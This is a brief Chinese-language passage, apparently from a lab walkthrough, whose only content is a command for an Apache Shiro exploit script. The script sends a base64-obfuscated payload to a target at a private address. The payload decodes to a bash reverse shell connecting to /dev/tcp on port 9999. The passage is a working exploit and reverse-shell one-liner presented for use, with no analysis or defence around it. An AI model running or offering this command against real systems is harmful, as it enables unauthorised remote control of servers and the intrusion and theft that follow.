执行反弹shell语句：

```plain
python shiro_exploit.py -t 3 -u http://192.168.174.128:8080 -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}"
```

